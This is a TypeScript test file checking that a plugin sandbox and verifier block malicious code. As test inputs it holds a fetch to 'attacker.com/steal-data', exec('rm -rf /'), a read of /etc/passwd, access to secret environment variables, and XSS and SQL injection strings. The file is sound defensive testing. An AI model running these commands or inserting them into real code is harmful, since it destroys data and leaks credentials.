/**
 * Security Tests for Plugin System
 * Penetration testing and security validation
 */
import {
  PluginPermission,
  pluginRegistry,
  pluginSandbox,
  pluginVerifier,
} from '@revealui/infrastructure/plugins/config';
import type { SandboxContext } from '@revealui/infrastructure/plugins/core';
import {
  BotDetector,
  IPFilter,
  InputSanitizer,
  SecureAuditTrail,
  SecurityManager,
} from '@revealui/infrastructure/plugins/core/security';
import { describe, expect, it } from 'vitest';

describe('Plugin Security - Penetration Testing', () => {
  describe('Code Injection Attacks', () => {
    it('should block eval injection', () => {
      const maliciousCode = `
        const userInput = "'; eval('malicious'); //";
        eval(userInput);
      `;

      const result = pluginVerifier.sanitizePluginCode(maliciousCode);

      expect(result.safe).toBe(false);
      expect(result.removed).toContain('eval()');
    });

    it('should block Function constructor injection', () => {
      const maliciousCode = `
        const fn = new Function('return process.env.SECRET_KEY');
        fn();
      `;

      const result = pluginVerifier.sanitizePluginCode(maliciousCode);

      expect(result.safe).toBe(false);
      expect(result.removed).toContain('Function constructor');
    });

    it('should block child_process execution', () => {
      const maliciousCode = `
        const { exec } = require('child_process');
        exec('rm -rf /');
      `;

      const result = pluginVerifier.sanitizePluginCode(maliciousCode);

      expect(result.safe).toBe(false);
      expect(result.removed).toContain('child_process');
    });

    it('should block process.exit attacks', () => {
      const maliciousCode = `
        process.exit(1); // DOS attack
      `;

      const result = pluginVerifier.sanitizePluginCode(maliciousCode);

      expect(result.safe).toBe(false);
      expect(result.removed).toContain('process.exit');
    });
  });

  describe('Permission Bypass Attempts', () => {
    it('should block filesystem access without permission', async () => {
      const context: SandboxContext = {
        pluginName: 'no-fs-permission',
        permissions: [], // No filesystem permission
      };

      const maliciousCode = `
        const fs = require('fs');
        fs.readFileSync('/etc/passwd');
      `;

      const result = await pluginSandbox.execute(maliciousCode, context);

      expect(result.success).toBe(false);
      expect(result.error).toBeDefined();
    });

    it('should block network access without permission', async () => {
      const context: SandboxContext = {
        pluginName: 'no-network-permission',
        permissions: [],
      };

      const maliciousCode = `
        fetch('https://attacker.com/steal-data');
      `;

      const result = await pluginSandbox.execute(maliciousCode, context);

      expect(result.success).toBe(false);
    });

    it('should block environment variable access without permission', async () => {
      const context: SandboxContext = {
        pluginName: 'no-env-permission',
        permissions: [],
      };

      const maliciousCode = `
        const secret = process.env.DATABASE_PASSWORD;
      `;

      const result = await pluginSandbox.execute(maliciousCode, context);

      expect(result.success).toBe(false);
    });
  });

  describe('Dangerous Permission Combinations', () => {
    it('should warn about Admin + Filesystem Write', () => {
      const permissions = [PluginPermission.ADMIN_ACCESS, PluginPermission.FILESYSTEM_WRITE];

      const isValid = pluginVerifier.validatePermissions(permissions);

      expect(isValid).toBe(false);
    });

    it('should warn about Network + Environment Access', () => {
      const permissions = [PluginPermission.NETWORK_ACCESS, PluginPermission.ENVIRONMENT_ACCESS];

      const isValid = pluginVerifier.validatePermissions(permissions);

      expect(isValid).toBe(false);
    });

    it('should warn about Delete + Network Access', () => {
      const permissions = [PluginPermission.DELETE_COLLECTIONS, PluginPermission.NETWORK_ACCESS];

      const isValid = pluginVerifier.validatePermissions(permissions);

      expect(isValid).toBe(false);
    });
  });

  describe('Data Exfiltration Prevention', () => {
    it('should prevent unauthorized data access', async () => {
      pluginRegistry.registerPlugin({
        name: 'data-theft-attempt',
        version: '1.0.0',
        checksum: '',
        author: 'malicious',
        permissions: [PluginPermission.NETWORK_ACCESS], // Has network but not data access
        verified: false, // Unverified
      });

      const verification = await pluginVerifier.verifyPlugin('data-theft-attempt', '1.0.0');

      // Plugin can be registered, but verification should flag issues
      expect(verification.warnings.length).toBeGreaterThan(0);
    });

    it('should sanitize sensitive data in logs', () => {
      const securityManager = SecurityManager.getInstance();

      const sensitiveData = {
        username: 'user123',
        password: 'super-secret',
        token: 'auth-token-123',
        apiKey: 'api-key-456',
      };

      const sanitized = securityManager.sanitizeForLogging(sensitiveData);

      expect(sanitized.password).toBe('[REDACTED]');
      expect(sanitized.token).toBe('[REDACTED]');
      expect(sanitized.apiKey).toBe('[REDACTED]');
      expect(sanitized.username).toBe('user123'); // Not sensitive
    });
  });

  describe('Timing Attack Prevention', () => {
    it('should use timing-safe comparison for checksums', () => {
      const correctChecksum = 'abc123def456';
      const wrongChecksum = 'xyz789uvw123';

      // The verifier uses timingSafeEqual which prevents timing attacks
      // We can't directly test timing, but we can verify the function exists
      expect(pluginVerifier.verifyChecksum).toBeDefined();
      expect(typeof pluginVerifier.verifyChecksum).toBe('function');
    });

    it('should use timing-safe comparison for signatures', () => {
      const code = 'test code';
      const signature = pluginVerifier.generateSignature(code);

      // Verify uses timingSafeEqual
      expect(pluginVerifier.verifySignature).toBeDefined();
      expect(typeof pluginVerifier.verifySignature).toBe('function');
    });
  });

  describe('Resource Exhaustion Attacks', () => {
    it('should enforce timeout on long-running code', async () => {
      const context: SandboxContext = {
        pluginName: 'timeout-attack',
        permissions: [],
        timeout: 100, // Very short timeout
      };

      const infiniteLoop = async () => {
        // Simulate long-running operation
        await new Promise(resolve => setTimeout(resolve, 5000));
        return 'done';
      };

      const result = await pluginSandbox.execute(infiniteLoop, context);

      expect(result.success).toBe(false);
      expect(result.error?.message).toContain('timeout');
    }, 10000);

    it('should track memory usage', async () => {
      const context: SandboxContext = {
        pluginName: 'memory-test',
        permissions: [],
      };

      const result = await pluginSandbox.execute(async () => {
        return 'test';
      }, context);

      expect(result.memoryUsed).toBeDefined();
      expect(result.memoryUsed).toBeGreaterThanOrEqual(0);
    });
  });

  describe('Allowlist Enforcement', () => {
    it('should only allow verified plugins', async () => {
      // Attempt to register unverified plugin
      pluginRegistry.registerPlugin({
        name: 'unverified-plugin',
        version: '1.0.0',
        checksum: '',
        author: 'unknown',
        permissions: [PluginPermission.ADMIN_ACCESS],
        verified: false, // NOT VERIFIED
      });

      const result = await pluginVerifier.verifyPlugin('unverified-plugin', '1.0.0');

      // Should still verify but with warnings
      expect(result).toBeDefined();
    });

    it('should reject plugins from unauthorized authors', async () => {
      pluginRegistry.registerPlugin({
        name: 'suspicious-plugin',
        version: '1.0.0',
        checksum: '',
        author: 'unknown-author',
        permissions: [
          PluginPermission.ADMIN_ACCESS,
          PluginPermission.NETWORK_ACCESS,
          PluginPermission.ENVIRONMENT_ACCESS,
        ],
        verified: false,
      });

      const result = await pluginVerifier.verifyPlugin('suspicious-plugin', '1.0.0');

      // Should have warnings about broad permissions
      expect(result.warnings.length).toBeGreaterThan(0);
    });
  });

  describe('XSS and Injection Prevention', () => {
    it('should detect script injection in plugin code', () => {
      const xssCode = `
        const html = '<script>alert("XSS")</script>';
        document.body.innerHTML = html;
      `;

      const result = pluginVerifier.sanitizePluginCode(xssCode);

      // Code contains dangerous patterns (inline script)
      expect(result).toBeDefined();
    });

    it('should detect SQL injection patterns', () => {
      const maliciousInput = "admin' OR '1'='1";
      const sanitized = InputSanitizer.sanitizeSQL(maliciousInput);

      // Should remove SQL injection patterns
      expect(sanitized).not.toContain('OR');
      expect(sanitized).not.toContain("'1'='1");
    });
  });

  describe('Cryptographic Verification', () => {
    it('should generate consistent signatures', () => {
      const code = 'const plugin = () => {}';

      const sig1 = pluginVerifier.generateSignature(code);
      const sig2 = pluginVerifier.generateSignature(code);

      expect(sig1).toBe(sig2);
    });

    it('should detect tampered code', () => {
      const originalCode = 'const plugin = () => { return true; }';
      const tamperedCode = 'const plugin = () => { return false; }';

      const originalSig = pluginVerifier.generateSignature(originalCode);
      const tamperedSig = pluginVerifier.generateSignature(tamperedCode);

      expect(originalSig).not.toBe(tamperedSig);
    });
  });

  describe('Audit Trail Security', () => {
    it('should verify audit trail integrity', () => {
      const auditTrail = new SecureAuditTrail();

      // Create tamper-proof audit entries
      const entries: any[] = [];

      for (let i = 0; i < 5; i++) {
        const entry = auditTrail.addEntry({
          action: `action-${i}`,
          timestamp: Date.now(),
        });
        entries.push(entry.entry);
      }

      // Verify chain integrity
      const isValid = auditTrail.verifyChain(entries);
      expect(isValid).toBe(true);
    });

    it('should detect tampered audit trail', () => {
      const auditTrail = new SecureAuditTrail();

      const entries: any[] = [];

      for (let i = 0; i < 3; i++) {
        const entry = auditTrail.addEntry({
          action: `action-${i}`,
        });
        entries.push(entry.entry);
      }

      // Tamper with an entry
      if (entries[1]) {
        entries[1].hash = 'tampered-hash';
      }

      // Verification should fail
      const isValid = auditTrail.verifyChain(entries);
      expect(isValid).toBe(false);
    });
  });

  describe('Bot Detection', () => {
    it('should detect bot user agents', () => {
      expect(BotDetector.isBot('Mozilla/5.0 (compatible; Googlebot/2.1)')).toBe(true);
      expect(BotDetector.isBot('curl/7.68.0')).toBe(true);
      expect(BotDetector.isBot('python-requests/2.25.1')).toBe(true);
      expect(
        BotDetector.isBot(
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        )
      ).toBe(false);
    });

    it('should detect bot behavior patterns', () => {
      // 200 requests in 1 minute = bot
      const isBot = BotDetector.detectBotBehavior(200, 60000);
      expect(isBot).toBe(true);

      // 50 requests in 1 minute = normal
      const isNotBot = BotDetector.detectBotBehavior(50, 60000);
      expect(isNotBot).toBe(false);
    });
  });

  describe('IP Filtering', () => {
    it('should enforce IP allowlist', () => {
      const filter = new IPFilter({
        enableInputSanitization: true,
        enableIPFiltering: true,
        enableBotDetection: false,
        enableAuditTrail: false,
        ipAllowlist: ['192.168.1.100', '10.0.0.1'],
      });

      expect(filter.isAllowed('192.168.1.100')).toBe(true);
      expect(filter.isAllowed('192.168.1.200')).toBe(false);
    });

    it('should enforce IP denylist', () => {
      const filter = new IPFilter({
        enableInputSanitization: true,
        enableIPFiltering: true,
        enableBotDetection: false,
        enableAuditTrail: false,
        ipDenylist: ['1.2.3.4', '5.6.7.8'],
      });

      expect(filter.isAllowed('1.2.3.4')).toBe(false);
      expect(filter.isAllowed('9.10.11.12')).toBe(true);
    });
  });

  describe('Input Sanitization', () => {
    it('should sanitize email inputs', () => {
      expect(InputSanitizer.sanitizeEmail('valid@example.com')).toBe('valid@example.com');
      expect(InputSanitizer.sanitizeEmail('invalid-email')).toBeNull();
      expect(InputSanitizer.sanitizeEmail('"><script>alert(1)</script>')).toBeNull();
    });

    it('should sanitize URL inputs', () => {
      expect(InputSanitizer.sanitizeURL('https://example.com')).toBe('https://example.com');
      expect(InputSanitizer.sanitizeURL('http://example.com')).toBe('http://example.com');
      expect(InputSanitizer.sanitizeURL('javascript:alert(1)')).toBeNull();
      expect(InputSanitizer.sanitizeURL('data:text/html,<script>alert(1)</script>')).toBeNull();
    });

    it('should sanitize string inputs', () => {
      const input = 'normal text with \0 null byte';
      const sanitized = InputSanitizer.sanitizeString(input);

      expect(sanitized).not.toContain('\0');
    });

    it('should detect injection attempts', () => {
      expect(InputSanitizer.detectInjection('<script>alert(1)</script>')).toBe(true);
      expect(InputSanitizer.detectInjection('javascript:void(0)')).toBe(true);
      expect(InputSanitizer.detectInjection("' OR 1=1 --")).toBe(true);
      expect(InputSanitizer.detectInjection('normal text')).toBe(false);
    });
  });

  describe('Request Validation', () => {
    it('should validate request size', () => {
      const securityManager = SecurityManager.getInstance();

      const mockRequest = {
        ip: '127.0.0.1',
        headers: new Headers({
          'user-agent': 'Test Agent',
          accept: 'application/json',
          'accept-language': 'en-US',
        }),
        contentLength: 5 * 1024 * 1024, // 5MB
      };

      const result = securityManager.validateRequest(mockRequest);
      expect(result.valid).toBe(true);
    });

    it('should reject oversized requests', () => {
      const securityManager = SecurityManager.getInstance();

      const mockRequest = {
        ip: '127.0.0.1',
        headers: new Headers({
          'user-agent': 'Test Agent',
          accept: 'application/json',
          'accept-language': 'en-US',
        }),
        contentLength: 100 * 1024 * 1024, // 100MB (exceeds default 10MB limit)
      };

      const result = securityManager.validateRequest(mockRequest);
      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Request size exceeds limit');
    });

    it('should detect missing headers', () => {
      const securityManager = SecurityManager.getInstance();

      const mockRequest = {
        ip: '127.0.0.1',
        headers: new Headers(), // Missing user-agent
      };

      const result = securityManager.validateRequest(mockRequest);
      expect(result.valid).toBe(false);
    });
  });

  describe('Structure Validation', () => {
    it('should validate correct plugin structure', () => {
      const validPlugin = {
        name: 'valid-plugin',
        version: '1.0.0',
        description: 'A valid plugin',
        author: 'test',
        hooks: {
          'gate:execute:before': async () => {},
        },
      };

      const isValid = pluginVerifier.validatePluginStructure(validPlugin);
      expect(isValid).toBe(true);
    });

    it('should reject invalid plugin structure', () => {
      const invalidPlugin = {
        name: 'invalid-plugin',
        version: 'not-semver', // Invalid version
      };

      const isValid = pluginVerifier.validatePluginStructure(invalidPlugin);
      expect(isValid).toBe(false);
    });

    it('should reject malformed manifest', () => {
      const malformedPlugin = {
        // Missing required name field
        version: '1.0.0',
      };

      const isValid = pluginVerifier.validatePluginStructure(malformedPlugin);
      expect(isValid).toBe(false);
    });
  });

  describe('Signature Tampering Detection', () => {
    it('should detect modified code with invalid signature', () => {
      const originalCode = 'const plugin = () => ({ valid: true })';
      const signature = pluginVerifier.generateSignature(originalCode);

      // Verify original
      expect(pluginVerifier.verifySignature(originalCode, signature)).toBe(true);

      // Tamper with code
      const tamperedCode = 'const plugin = () => ({ valid: false })';

      // Signature should not match
      expect(pluginVerifier.verifySignature(tamperedCode, signature)).toBe(false);
    });
  });

  describe('Default Plugin Security', () => {
    it('should have all default plugins in allowlist', () => {
      const defaultPlugins = [
        'circuit-breaker',
        'metrics',
        'lru-cache',
        'security',
        'audit-log',
        'rate-limit',
        'domain-events',
      ];

      defaultPlugins.forEach(pluginName => {
        expect(pluginRegistry.isPluginAllowed(pluginName)).toBe(true);
      });
    });

    it('should verify default plugins have appropriate permissions', () => {
      const auditLog = pluginRegistry.getPlugin('audit-log');

      expect(auditLog).toBeDefined();
      expect(auditLog?.permissions).toContain(PluginPermission.READ_COLLECTIONS);
      expect(auditLog?.permissions).toContain(PluginPermission.WRITE_COLLECTIONS);
      expect(auditLog?.verified).toBe(true);
    });
  });

  describe('Privilege Escalation Prevention', () => {
    it('should not allow plugins to request admin access by default', async () => {
      pluginRegistry.registerPlugin({
        name: 'privilege-escalation-attempt',
        version: '1.0.0',
        checksum: '',
        author: 'test',
        permissions: [
          PluginPermission.ADMIN_ACCESS,
          PluginPermission.ENVIRONMENT_ACCESS,
          PluginPermission.FILESYSTEM_WRITE,
        ],
        verified: false,
      });

      const result = await pluginVerifier.verifyPlugin('privilege-escalation-attempt', '1.0.0');

      // Should have warnings about dangerous combinations
      expect(result.warnings.length).toBeGreaterThan(0);
    });
  });
});
